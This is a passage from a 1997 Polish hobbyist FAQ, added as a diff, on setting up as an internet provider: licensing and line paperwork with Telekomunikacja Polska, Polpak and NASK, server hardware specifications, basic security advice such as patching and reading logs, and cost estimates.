+	- zarobie duzo szmalu, w krotkim czasie. " zastanow czy 
+	wiesz na co sie porywasz .... Nie mowie tu o twoich umie-
+	jetnosciach. To wbrew pozorom jest bardzo latwe ( no w 
+	pewnym stopniu jak masz kogo sie pytac ). Zapewne nie 
+	zastanowiles sie jeszcze nad ponizszymi pytaniami:
+		
+		Zostaniesz Providerem i co dalej ? 
+
+		Gdzie bedziesz szuka³ klientów ? 
+
+		Czy klienci pozwola ci spsplacic dlugi ? (jesli 
+		 ich nie bedziesz mial to jestes burzuj i cie stac
+		 nawet na deficytowy interes)
+
+		Skad wezmiesz nato pieniadze ? 
+
+	Te pytania zaslania cie wizja (zazwyczaj mylna) bycia 
+	Internet Providerem (no moze poza tym ostatnim). Postaram
+	sie przedstawic Ci jak to ze mna bylo.
+
+	1.2	No powiedzmy ,ze masz pieni¹dze lub ich oczeku-
+	jesz, to najlepszy moment na tak zwane robote papierkowa.
+	Najpierw musisz naskrobac pisemko do "uwielbianej" Tele-
+	komunikacji Polskiej s.a. w twoim miescie, a najlepiej 
+	sie tam osobiscie pofatygowac (skroci to bul oczekiwania
+	 o jakies 2 tyg.) i spytac sie ich czy oni zalatwi¹ ci 
+	polaczenie z Polpakiem, czy musisz sie fatygowac do wo-
+	jewodzkiej TP s.a. lub do najblizszego wezla Polpaku. 
+	(TP s.a. odpowiada za samo lacze a Polpak za podlaczenie 
+	do naszego nalogu Internetu). Najpierw piszesz o mozli-
+	wosci techniczne podlsczenia dzierzawki do twego lokalu,
+	a potem o zestawienie lacza do Inetu. No powiedzmy, ze 
+	ci podlacza ukochany kabelek. Teraz pora pojechac do 
+	Warszawy do Ministerswa £acznosci i Telekomunikacji 
+	i zlozyc podanie o przyznanie licencji na uslugi Tele-
+	komunikacjyjne w tym Internetu. ( z tego co wiem jeszcze
+	nie odmowili ).
+
+	1.3	No ... teraz mozesz siedziec i czekac. Mozesz 
+	uczyc jak byc Administratorem systemu, szukac klientow,
+	zbierac jeszcze wiecej gotowki albo upic lub ujarac sie
+	ze szczescia (pozniej bedziesz pil ze zmartwien !!! 
+	- wiec teraz korzystaj i ciesz sie)
+
+2. Sprzêt.
+
+	2.1	Najwazniejsze to musisz wiedziec na jakim sys-
+	temie go postawisz .....Server jest bardzo wa¿ny ... 
+	musi podolac obsludze poczty, WWW, FTP i jeszcze innym 
+	uslugom.
+
+	Serwer postawiony na Shitcie - WindowsNT Serwer:
+	Dual Pentium - min 150
+	128 Mb RAM 
+	HDD 2 GB to ciutke malo w przyszlosci i to SCSI
+	CD-ROM min x8
+	Mysz !!!!!
+
+	Serwer postawiony na Linuxie - np. Red Hat 4.2:
+	Pentium 133
+	32 Mb RAM
+	HDD 1 GB to ciutke malo w przyszloœci i to SCSI
+	CD-ROM x8
+	Monitor Hercules
+	
+	a polecam linux Red Hat 4.2:
+	dual Pentium 133
+	64 Mb RAM
+	HDD 2,5 Gb SCSI
+	CD x12
+	Monitor Hercules
+
+	2.2	To zalezy co bedziesz robic na nim......
+	Ja mam sprzecik na Win95 i WinNT Workstation tzn:
+	Itnel 166MMX, 64Mb ram , 4Gb SCSI i stwierdzam
+	ze to do grafiki za malo :((((
+
+	2.3	To wazne ...musisz miec dobry Router !!!!
+	Ja zdecydowalem sie na Motorole ... ale jak nie masz
+	kasy to kup karte Routera i postaw drugi sprzecik.
+
+	2.4	Modemy zapewnia Polpak .... 
+	Musz¹ byæ w standarcie v.35.
+
+3. Co robic jak cie ju¿ podlacza.
+
+	Jak to co robic .... zabawic sie !!!
+
+	A tak powaznie to wyslac do NASKU maila o zarejestrowanie 
+	domeny - to kosztuje grosze (patrzac na calosc) 150,-
+	I szukac pierwszych klientow....konfigurowac serwer.
+
+4. Trudne zycie - Hackerzy !!!
+
+	To jest rzeczywisty problem - zawsze znajdzie sie taki 
+	hacker ktory sie wlamie i narobi ci bajzlu ...........
+	Wiec albo sam badz hackerem i miej z nimi dobre stosunki
+	lub zapisz sie do grup dyskusyjnych o Linuxie i Ochronie
+	danych (Zabezpieczania Linuxa) i instaluj ka¿dy najnowszy
+	patch !!!
+	A jak bedziesz mial ta przyjemnosc ... i ktos sie wlamie
+	to czytaj wszystkie logi ... a jak ich nie bedzie to
+	sprobuj je odzyskac...jest to zrodlo wszelkich informacji
+	o potencjalnych wlamywaczach. Lub w desperacji wlacz IRC'a
+	i idz na #hackpl i podpusc kogos .... jak sie postarasz
+	to bedziesz wiedzial kto siê wlamal. A od nowego roku
+	wchodzi w zycie nowe prawo i kazdy hacker moze isc do
+	pudla.
+
+5. Monopoliœci.
+		Charakterystyki .....
+
+	5.1 Telekomunikacja Polska s.a. :
+	    - d³ugo papiery wedruja z lokalnej siedziby do 
+	      wojewodzkiej.
+	    - zdzieraja majatek.
+	
+	5.2 Polpak
+	    - zdzieraja majatek !!!
+	    - czeste awarie
+
+	5.3 NASK
+	    - gubi¹ papiery i E-maile !!!
+	    - s¹ Dyktatorem !!! podskoczysz to cie odlacza
+	      dotyczy to umieszczania niewinnych stron
+	      ( o charakterze edukacyjnym ) hackerow
+	      jest to ograniczenie wolnosci slowa i pisma.
+
+6. Ca³kowity koszt.
+	
+	Ca³kowity koszt to 20.000 z³ (nowych czyli 200mln starych)
+
+
+No to koniec .... bede ciagle rozbudowywal FAQ ....
+bazuj¹c na wlasnych doswiadczeniach.
+NApewno wielu z was uzna to za nudny tekst .... szkoda
+ale sadze ze pare osob to oswiecilo.
+
+Uwagi prosze kierowac : reiden@multi-ip.com.pl nemes@mega.com.pl
+
+
+	
+
+
+--------------------------------------------------------------------------------
+
+W przygotowywaniu faq brali udzial:
+
+LordCreg - redagowanie i pare textow ( glowny odpowiedzialny za FAQ)
+
+Hellfire - Te texty powstaly na podstawie jego FAQ, ktore bylo "szkieletem"
+do tego wszytskiego, oczywiescie za jego zgoda:)
+Dlatego nie dziwcie sie ze narazie wiekszosc textow jest jego autorstwa...
+(drugi glowny odpowiedzialny za skladanie tego wszystkiego do kupy)
+
+AnGel
+Nemes- to ten Provider, dzieki za oswiecenie paru spraw
+
+Jesli napisales jakies txty, ktore chcialbys tu zamiescic, to wyslij je na adres
+grzywacz@ptk.krakow.pl
+jesli beda ok, to zastana tutaj zamieszczone;)
+
+Copyright 1997 by DHS
+EOF
